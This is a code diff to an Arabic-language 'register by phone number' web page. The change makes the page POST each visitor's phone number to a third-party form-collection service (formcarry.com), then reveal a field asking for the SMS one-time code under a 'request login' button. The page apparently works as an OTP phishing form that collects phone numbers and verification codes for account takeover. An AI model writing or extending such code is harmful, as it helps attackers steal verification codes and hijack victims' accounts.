@@ -88,7 +88,7 @@
 <body>
 
   <div class="container">
-    <h2>التسجيل برقم الهاتف </h2>
+    <h2>التسجيل برقم الهاتف</h2>
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
@@ -99,7 +99,8 @@
 
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
-        <label for="code">أنتظر رسالــة sms...  :</label>
+        <p id="displayPhone"></p>
+        <label for="code">أنتظر رسالــة sms... :</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
         <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
@@ -144,11 +145,29 @@
         return false;
       }
 
-      codeField.style.display = 'block';
-      sendPhoneBtn.disabled = true;
-      startTimer(480); // 8 دقائق
+      fetch('https://formcarry.com/s/zmPYXkf3utw', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({ phone: phoneInput.value })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('فشل إرسال رقم الهاتف');
+        }
 
-      alert('تم إرسال رقم الهاتف بنجاح، سيتم طلب الدخول قريبًا.');
+        codeField.style.display = 'block';
+        sendPhoneBtn.disabled = true;
+        startTimer(480); // 8 دقائق
+        document.getElementById('displayPhone').textContent = `رقم الهاتف: ${phoneInput.value}`;
+        alert('تم إرسال رقم الهاتف بنجاح، سيتم طلب الدخول قريبًا.');
+      })
+      .catch(error => {
+        console.error('فشل الإرسال:', error);
+        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
+      });
 
       return false;
     }
